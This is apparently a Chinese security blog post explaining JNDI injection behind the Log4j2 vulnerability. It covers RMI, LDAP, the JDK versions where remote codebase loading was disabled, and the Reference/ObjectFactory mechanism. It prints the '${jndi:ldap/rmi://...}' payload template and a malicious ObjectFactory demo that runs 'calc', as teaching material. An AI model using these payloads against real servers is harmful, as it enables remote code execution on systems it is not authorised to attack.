<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>JNDI入门 | h0ld1rs的博客</title><meta name="keywords" content="java安全"><meta name="author" content="h0ld1rs"><meta name="copyright" content="h0ld1rs"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="对JNDI的一些总结">
<meta property="og:type" content="article">
<meta property="og:title" content="JNDI入门">
<meta property="og:url" content="https://h0ld1rs.github.io/posts/3525.html">
<meta property="og:site_name" content="h0ld1rs的博客">
<meta property="og:description" content="对JNDI的一些总结">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://h0ld1rs.github.io/img/image/13.png">
<meta property="article:published_time" content="2022-01-27T16:19:21.000Z">
<meta property="article:modified_time" content="2022-03-13T16:23:21.695Z">
<meta property="article:author" content="h0ld1rs">
<meta property="article:tag" content="java安全">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://h0ld1rs.github.io/img/image/13.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://h0ld1rs.github.io/posts/3525"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'JNDI入门',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2022-03-14 00:23:21'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="generator" content="Hexo 6.0.0"><link rel="alternate" href="/atom.xml" title="h0ld1rs的博客" type="application/atom+xml">
</head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/1.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data is-center"><div class="data-item"><a href="/archives/"><div class="headline">文章</div><div class="length-num">14</div></a></div><div class="data-item"><a href="/tags/"><div class="headline">标签</div><div class="length-num">4</div></a></div><div class="data-item"><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 目录</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/image/13.png')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">h0ld1rs的博客</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 目录</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">JNDI入门</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-01-27T16:19:21.000Z" title="发表于 2022-01-28 00:19:21">2022-01-28</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-03-13T16:23:21.695Z" title="更新于 2022-03-14 00:23:21">2022-03-14</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/java%E5%AE%89%E5%85%A8/">java安全</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="JNDI入门"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span><span class="post-meta-separator">|</span><span class="post-meta-commentcount"><i class="far fa-comments fa-fw post-meta-icon"></i><span class="post-meta-label">评论数:</span><a href="/posts/3525.html#post-comment"><span id="twikoo-count"></span></a></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="JNDI入门指北"><a href="#JNDI入门指北" class="headerlink" title="JNDI入门指北"></a>JNDI入门指北</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>log4j2 宛如过年一般，趁此机会对没理清的  JNDI 协议仔细再捋一捋</p>
<p>log4j的payload很好记：<code>$&#123;jndi:ldap/rmi://xxxxxx/exp&#125;</code></p>
<p>那么，我们就需要研究一下是怎么来的。</p>
<p>首先来看rpc</p>
<h1 id="RPC"><a href="#RPC" class="headerlink" title="RPC"></a>RPC</h1><p>RPC即 <code>Remote Procedure Call</code>（远程过程调用），&#x3D;&#x3D;是一种技术思想而并非一种规范的协议&#x3D;&#x3D;，是一种通过网络从远程计算机请求服务的过程。</p>
<p>常见 RPC 技术和框架有：</p>
<ul>
<li>应用级的服务框架：阿里的 Dubbo&#x2F;Dubbox、Google gRPC、Spring Boot&#x2F;Spring Cloud。</li>
<li>远程通信协议：RMI、Socket、SOAP(HTTP XML)、REST(HTTP JSON)。</li>
<li>通信框架：MINA 和 Netty。</li>
</ul>
<p>一个rpc框架有以下必备条件：传输协议，序列化，注册中心，服务路由，负载均衡，IO框架，心跳机制，服务鉴权，服务隔离，服务治理，监控埋点。</p>
<ul>
<li>Dubbo：国内最早开源的 RPC 框架，由阿里巴巴公司开发并于 2011 年末对外开源，仅支持 Java 语言。</li>
<li>Motan：微博内部使用的 RPC 框架，于 2016 年对外开源，仅支持 Java 语言。</li>
<li>Tars：腾讯内部使用的 RPC 框架，于 2017 年对外开源，仅支持 C++ 语言。</li>
<li>Spring Cloud：国外 Pivotal 公司 2014 年对外开源的 RPC 框架，仅支持 Java 语言</li>
<li>gRPC：Google 于 2015 年对外开源的跨语言 RPC 框架，支持多种语言。</li>
<li>Thrift：最初是由 Facebook 开发的内部系统跨语言的 RPC 框架，2007 年贡献给了 Apache 基金，成为 Apache 开源项目之一，支持多种语言。</li>
</ul>
<h1 id="联系"><a href="#联系" class="headerlink" title="联系"></a>联系</h1><p>先直接给出结论</p>
<p><code>Spring Cloud是一种RPC框架，但是区别是它使用的是http协议的传输，整体技术和普通RPC如dubbo/thrift有很大区别，所以一般会分开说。</code></p>
<p>而Springcloud的核心是微服务，微服务中使用 RPC的思想尤为明显</p>
<p>我们熟知的一些漏洞，能够远程加载恶意类的，或多或少都有着使用微服务架构的影子，所以我们才需要对这一领域进行研究。</p>
<p><img src="https://pic3.zhimg.com/v2-cade4fe83bffcb193c05c68f63990c2e_b.jpg" alt="img"></p>
<h2 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h2><ul>
<li><p>在分布式场景中，我们一般要考虑调用问题</p>
</li>
<li><p>远程过程调用，要能够像本地过程调用一样方便，让使用者感受不到远程调用的逻辑</p>
</li>
<li><p>rpc的过程图</p>
<p><img src="https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fimg2018.cnblogs.com%2Fblog%2F1009724%2F201909%2F1009724-20190918170851529-1634452001.png&refer=http%3A%2F%2Fimg2018.cnblogs.com&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=jpeg?sec=1643940372&t=ea8df0dfd0d97632c93a32d97dd5252f" alt="img"></p>
</li>
<li><p>RPC：(Remote Procedure call) 即远程过程调用，它是一个计算机通信协议，RPC与语言无关</p>
</li>
<li><p>RMI：(Remote Method Invocation) 远程方法执行，是RPC的纯java实现方式</p>
</li>
</ul>
<p>简单来说，就是一个节点请求另一个节点的服务</p>
<ol>
<li>服务端需要暴露一个接口 (让客户端知道服务端有哪些可以请求的服务)</li>
<li>客户端需要把调用方法名，参数都传递到服务端</li>
<li>服务端接收客户端发来的方法名和参数，在自己的服务中找到对应的方法，然后去调用</li>
<li>服务器端把结果发送到客户端</li>
</ol>
<p>通过网络传输字符串，对象等数据，使用时常伴随着序列化使用。</p>
<p>但是，光看这样，无法理解其中的细节，我们需要深入看一下RPC的架构</p>
<p><img src="http://i.zmofun.com/2021/04/19/03ba66223774d.png" alt="image.png"></p>
<p>在一个典型 RPC 的使用场景中，包含了服务发现、负载、容错、网络传输、序列化等组件，其中“RPC 协议”就指明了程序如何进行网络传输和序列化。(这个在后面的demo中会介绍到)</p>
<h1 id="微服务"><a href="#微服务" class="headerlink" title="微服务"></a>微服务</h1><p>参考文章：<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/7293b148028f">https://www.jianshu.com/p/7293b148028f</a></p>
<p>这里先谈一下微服务，什么是微服务</p>
<ol>
<li>微服务是系统架构上的一个风格，主旨是将一个原本独立的系统拆分成多个小型服务</li>
<li>这些小服务能够在各自独立的进程中运行，服务之间通过HTTP的 Restful API进行通信协作。</li>
</ol>
<p><img src="https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fwww.d8jd.com%2FPublic%2Fuploads%2F201802%2F15183252168565.png&refer=http%3A%2F%2Fwww.d8jd.com&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=jpeg?sec=1643961705&t=2dac9932ea7dc73a23d5eba67959a390" alt="img"></p>
<p>比方说，一个服务里面，就有一个<code>apache + database</code>，</p>
<p>被拆分成的每一个小型服务都围绕着系统中的某一项或一些耦合度较高的业务功能进行构建，并且每个服务都维护着自身的数据存储、业务开发、自动化测试案例以及独立部署机制。</p>
<h2 id="为什么要使用微服务"><a href="#为什么要使用微服务" class="headerlink" title="为什么要使用微服务"></a>为什么要使用微服务</h2><p>微服务架构有别于更为传统的单体式方案，可将应用拆分成多个核心功能。&#x3D;&#x3D;每个功能都被称为一项服务，可以单独构建和部署，这意味着各项服务在工作（和出现故障）时不会相互影响&#x3D;&#x3D;。这有助于您更好实现 DevOps 的技术，让持续集成和持续交付(CI&#x2F;CD)[软件构造的知识点]更加利于实现。</p>
<p>按照官方的说法，实施微服务需要有：服务组件化，按业务阻止团队，做产品的态度，&#x3D;&#x3D;轻量化的通信机制&#x3D;&#x3D;，去中心化处理数据，去中心化管理数据，基础设施自动化，容错测试，容错设计，演进式设计。</p>
<p>其中，我们攻击具有JNDI漏洞的业务时，大部分是从轻量化的通信机制中入手的。</p>
<p>这里以微服务 zookeeper为例，看一下微服务的过程</p>
<p><img src="https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fstatic.zybuluo.com%2Fzhangnian88123%2Fs1glz9ip0513b06uyqs18rxp%2FQQ%25E6%2588%25AA%25E5%259B%25BE20160406183124.jpg&refer=http%3A%2F%2Fstatic.zybuluo.com&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=jpeg?sec=1643940871&t=2bfc85956cde9f3f996630d4fb78fec5" alt="img"></p>
<p>那么，我们伪造一个 微服务中间的服务器，类似于伪造JDBC反序列化漏洞中mysql服务端一样，让客户端访问恶意的服务器去加载数据，就可以达到我们的目的。</p>
<h3 id="关于jdk版本的问题"><a href="#关于jdk版本的问题" class="headerlink" title="关于jdk版本的问题"></a>关于jdk版本的问题</h3><p>师傅们经过测试，log4j给出了可以打的一些环境版本</p>
<p>总结是：<code>rmi 113之前可以用， ldap 191之前可以用</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">8u112 rmi可以利用</span><br><span class="line"></span><br><span class="line">8u112 ldap可以利用</span><br><span class="line"></span><br><span class="line">8u121 rmi失败</span><br><span class="line"></span><br><span class="line">8u121 ldap可以利用</span><br><span class="line"></span><br><span class="line">8u181 rmi失败</span><br><span class="line"></span><br><span class="line">8u181 ldap可以利用</span><br><span class="line"></span><br><span class="line">8u191 rmi失败</span><br><span class="line"></span><br><span class="line">8u191 ldap失败</span><br><span class="line"></span><br><span class="line">8u301 rmi失败</span><br><span class="line"></span><br><span class="line">8u301 ldap失败</span><br><span class="line"></span><br><span class="line"><span class="number">11.012</span> rmi失败</span><br><span class="line"></span><br><span class="line"><span class="number">11.012</span> ldap失败</span><br></pre></td></tr></table></figure>

<h2 id="那么，为什么191和113是一个分水岭呢？"><a href="#那么，为什么191和113是一个分水岭呢？" class="headerlink" title="那么，为什么191和113是一个分水岭呢？"></a>那么，为什么191和113是一个分水岭呢？</h2><p>我们先来分析一个例子</p>
<h3 id="LDAP-JNDI远程加载恶意类"><a href="#LDAP-JNDI远程加载恶意类" class="headerlink" title="LDAP+JNDI远程加载恶意类"></a>LDAP+JNDI远程加载恶意类</h3><p>ldap的jndi在&#x3D;&#x3D;6u211、7u201、8u191、11.0.1&#x3D;&#x3D;后也将默认的<code>com.sun.jndi.ldap.object.trustURLCodebase</code>设置为了false，并且这些变动对应的分配了一个漏洞编号CVE-2018-3149。</p>
<p>这就是为什么师傅们说到191之后就不再适用了，因为如果我们想要在191之后的版本进行使用ldap进行加载恶意类，需要我们手动去设置参数<code>com.sun.jndi.ldap.object.trustURLCodebase</code>设置为<code>true</code></p>
<p>具体可以见 Vulfocus 靶场环境</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull vulfocus/log4j2-rce-2021-12-09:latest </span><br></pre></td></tr></table></figure>

<p>中有代码这么写道</p>
<p>使用 docker copy 命令将 <code>demo.jar</code>拷贝到主机进行反编译</p>
<p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20211212121439.png"></p>
<p>可以看到师傅在jdk版本不满足的情况下设置了属性为 true</p>
<p>接下来，我们以一张图来理清思路</p>
<p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20211212122707.png"></p>
<h3 id="JNDI"><a href="#JNDI" class="headerlink" title="JNDI"></a>JNDI</h3><p><code>JNDI(Java Naming and Directory Interface)</code>是Java提供的<code>Java 命名和目录接口</code>。通过调用<code>JNDI</code>的<code>API</code>应用程序可以定位资源和其他程序对象。<code>JNDI</code>是<code>Java EE</code>的重要部分，需要注意的是它并不只是包含了<code>DataSource(JDBC 数据源)</code>，<code>JNDI</code>可访问的现有的目录及服务有:<code>JDBC</code>、<code>LDAP</code>、<code>RMI</code>、<code>DNS</code>、<code>NIS</code>、<code>CORBA</code>。</p>
<p>JNDI如上很多协议，但是我们这里只分析 LDAP和RMI</p>
<h3 id="LDAP目录服务"><a href="#LDAP目录服务" class="headerlink" title="LDAP目录服务"></a>LDAP目录服务</h3><p>LDAP全称是轻量级目录访问协议。</p>
<p>LDAP的服务处理工厂类是:com.sun.jndi.ldap.LdapCtxFactory，连接LDAP之前需要配置好远程的LDAP服务。</p>
<h3 id="RMI"><a href="#RMI" class="headerlink" title="RMI"></a>RMI</h3><p>RMI的流程中，客户端和服务端之间传递的是一些序列化后的对象，这些对象在反序列化时，就会去寻找类。如果某一端反序列化时发现一个对象，那么就会去自己的CLASSPATH下寻找想对应的类；如果在本地没有找到这个类，就会去远程加载codebase中的类。</p>
<h2 id="远程加载恶意类-攻击服务端"><a href="#远程加载恶意类-攻击服务端" class="headerlink" title="远程加载恶意类(攻击服务端)"></a>远程加载恶意类(攻击服务端)</h2><h3 id="RMI服务端远程加载恶意类"><a href="#RMI服务端远程加载恶意类" class="headerlink" title="RMI服务端远程加载恶意类"></a>RMI服务端远程加载恶意类</h3><p>根据p师傅知识星球的内容可知rmi进行加载的时候，会涉及到<code>codebase</code>，codebase是一个地址，指定<code>jvm</code>从哪个地方去搜集类，和ClassPath，jdbc的url一样，通常是远程的URL，比如http,ftp等</p>
<p>如果我们指定<code>codebase=http://example.com</code>，然后加载<code>org.vulhub.example.Example</code>类，则宿主机上的jvm将会去下载<code>http://example.com/org.vulhub.example/Example.Class</code>，并作为要加载类的字节码。</p>
<p>在RMI的流程中，客户端和服务端之间传递的是一些序列化后的对象，这些对象在反序列化时，就会去寻找类。如果某一端反序列化时发现一个对象，那么就会去自己的CLASSPATH下寻找想对应的类；如果在本地没有找到这个类，就会去远程加载codebase中的类。</p>
<p>所以，我们只要控制了<code>codebase</code>，就可以加载任何恶意类。</p>
<p>在RMI中，我们是可以将<code>codebase</code>随着序列化的数据一起传输的，服务器在接受到数据后，就会去ClassPath和指定的codebase去寻找类。</p>
<h4 id="满足条件"><a href="#满足条件" class="headerlink" title="满足条件"></a>满足条件</h4><p>因此，官方在注意到后，在后面的版本加了限制，满足如下条件的才可以攻击</p>
<ol>
<li>安装并配置了<code>SecurityManager</code>，(需要自己设置为trust)</li>
<li>java.rmi.server.useCodebaseOnly 配置为 flase，如果为 true，则将禁用自动加载类文件，不允许远程加载对象</li>
</ol>
<blockquote>
<p>java在6u45、7u21，8u121，开始java.rmi.server.useCodebaseOnly默认配置已经改为了true。</p>
</blockquote>
<h3 id="RMI-JNDI远程加载恶意类"><a href="#RMI-JNDI远程加载恶意类" class="headerlink" title="RMI+JNDI远程加载恶意类"></a>RMI+JNDI远程加载恶意类</h3><p>最典型的是 fastjson rmi+jndi注入。</p>
<p>被引用的ObjectFactory对象还将受到<code>com.sun.jndi.rmi.object.trustURLCodebase</code>配置限制，如果该值为false(不信任远程引用对象)则无法调用远程的引用对象。</p>
<blockquote>
<p>rmi的jndi在6u132，7u122，8u113 开始 <code>com.sun.jndi.rmi.object.trustURLCodebase</code>默认值已改为了false。</p>
<p><code>com.sun.jndi.rmi.object.trustURLCodebase</code>、<br><code>com.sun.jndi.cosnaming.object.trustURLCodebase</code> 的默认值变为false</p>
</blockquote>
<h3 id="LDAP-JNDI远程加载恶意类-1"><a href="#LDAP-JNDI远程加载恶意类-1" class="headerlink" title="LDAP+JNDI远程加载恶意类"></a>LDAP+JNDI远程加载恶意类</h3><p>还是 fastjson ldap+jndi注入</p>
<blockquote>
<p>ldap的jndi在6u211、7u201、8u191、11.0.1后也将默认的<code>com.sun.jndi.ldap.object.trustURLCodebase</code>设置为了false</p>
</blockquote>
<h3 id="JNDI注入之-rmi-jndi"><a href="#JNDI注入之-rmi-jndi" class="headerlink" title="JNDI注入之 rmi+jndi"></a>JNDI注入之 rmi+jndi</h3><p>如果我们再RMI服务端绑定一个恶意的引用对象，RMI 客户端在获取服务端绑定的对象的时候，发现是一个Reference对象后，检查当前JVM是否允许 (基于 trustURLCodebase)加载远程引用的对象，如果允许加载 Reference且本地不存在对象工厂类，则使用 URLClassLoader 加载远程的jar，去加载我们构建的恶意对象工厂(ReferenceeObjectFactory)类，然后调用其中的<code>getObjectInstance</code>方法从而触发方法中恶意RCE代码。</p>
<p>所以，如果当前RMI客户端允许加载远程调用的对象，且RMI服务端绑定的是<code>Referrnce</code>恶意对象，则可以进行RMI攻击</p>
<h4 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h4><p>上面也说到了，对于jdk版本过高的，需要手动开启<code>trustURLCodebase=true</code>，不开启的话会提示<code>The Object factory is untrusted</code>    </p>
<h4 id="RMI-1"><a href="#RMI-1" class="headerlink" title="RMI"></a>RMI</h4><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20211212171126.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">列举几个函数</span><br><span class="line"></span><br><span class="line">bind：将远程对象绑定到注册中心</span><br><span class="line">rebind：重新绑定一个远程对象</span><br><span class="line">unbind：取消一个过程对象的绑定</span><br><span class="line">list：列出注册中心绑定对象</span><br><span class="line">lookup：在注册中心获取一个远程对象的存根</span><br></pre></td></tr></table></figure>

<h4 id="服务端与注册中心"><a href="#服务端与注册中心" class="headerlink" title="服务端与注册中心"></a>服务端与注册中心</h4><p>JRMP：客户端，服务端，注册中心三者之间的通信协议称为 JRMP协议</p>
<p>下面对一些常用的操作进行概括</p>
<p><strong>服务端与注册中心</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="number">1099</span>);</span><br><span class="line"><span class="comment">//默认是1099端口</span></span><br><span class="line">registry.bind(....);</span><br></pre></td></tr></table></figure>

<p>通过<code>getRegistry</code>方法获取到的其实是一个<code>RegistryImpl_Stub</code>的代理对象，其中封装了注册中心的一些TCP信息，用于与之发起请求</p>
<h3 id="JNDI注入前置"><a href="#JNDI注入前置" class="headerlink" title="JNDI注入前置"></a>JNDI注入前置</h3><h4 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h4><p>JNDI有多种命名&#x2F;目录提供的形式，所以客户端要<code>IntialContext</code>类来获取初始目录环境</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;rmi://localhost:1099/hello&quot;</span>;</span><br><span class="line"><span class="type">InitialContext</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">context.lookup(url);</span><br></pre></td></tr></table></figure>

<p>JNDI会根据 url 的形式来动态解析，比如对于以RMI形式提供的服务，url就可以写成<code>rmi://&#123;ip&#125;:&#123;port&#125;/&#123;name&#125;</code>；对于LDAP的服务，url就可以写成 <code>ldap://&#123;ip&#125;:&#123;port&#125;/&#123;name&#125;</code></p>
<h4 id="JNDI注入的根–Reference"><a href="#JNDI注入的根–Reference" class="headerlink" title="JNDI注入的根–Reference"></a>JNDI注入的根–Reference</h4><p><code>Reference：在JNDI服务中允许使用系统以外的对象，比如在某些目录服务中直接引用远程的Java对象，但遵循一些安全限制</code></p>
<p>对于不存在命令&#x2F;目录范围内的对象，可以通过 Reference类来绑定一个外部的远程连接对象(一般以字节码形式通过http服务托管)，客户端可以通过lookup方法找到这个远程对象，获取相应的factory，然后通过factory将 reference转化成对象。</p>
<p>JNDI允许通过对象工厂(java.naming.spi.ObjectFactory)动态加载对象实现，例如，当查找绑定在名称空间中的打印机时，如果打印服务将打印机的名称绑定到<code>Reference</code>，则可以使用该打印机 Reference创建一个打印机对象，从而查找的调用者可以在查找后直接在该打印机对象上操作。</p>
<p>&#x3D;&#x3D;对象工厂必须实现 javax.naming.spi.ObjectFactory 接口，并且重写 getObjectInstance方法&#x3D;&#x3D;</p>
<p>所以我们这里就可以自己实现一个OjbectFactory接口的类，并重写getObjectInstance方法</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ReferenceObjectFactory</span> <span class="keyword">implements</span> <span class="title class_">ObjectFactory</span> &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> obj  包含可在创建对象时使用的位置或引用信息的对象（可能为 null）。</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> name 此对象相对于 ctx 的名称，如果没有指定名称，则该参数为 null。</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> ctx  一个上下文，name 参数是相对于该上下文指定的，如果 name 相对于默认初始上下文，则该参数为 null。</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> env  创建对象时使用的环境（可能为 null）。</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 对象工厂创建出的对象</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> Exception 对象创建异常</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getObjectInstance</span><span class="params">(Object obj, Name name, Context ctx, Hashtable&lt;?, ?&gt; env)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 在创建对象过程中插入恶意的攻击代码，或者直接创建一个本地命令执行的Process对象从而实现RCE</span></span><br><span class="line">        <span class="keyword">return</span> Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><strong>主要原理：JNDI Reference 远程加载Object Factory类的特性</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Reference(String name)</span><br><span class="line">    为类名为<span class="string">&quot;name&quot;</span>的对象构造一个新的应用</span><br><span class="line">Reference(String name , RefAddr addr)</span><br><span class="line">    为类型为<span class="string">&quot;name&quot;</span>的对象和地址构造一个新引用</span><br><span class="line">Reference(String name, ReAddr addr, String factory,String factoryLocation)</span><br><span class="line">    为类名为<span class="string">&quot;name&quot;</span>的对象，对象工厂的类名和为止以及对象的地址构造一个新的引用</span><br><span class="line">Reference(String name,String factory,String factoryLocation)</span><br><span class="line">    为类名为<span class="string">&quot;name&quot;</span>的对象以及对象工厂的类名和位置构造一个新的应用</span><br></pre></td></tr></table></figure>

<p>通过RMI来绑定一个Reference对象</p>
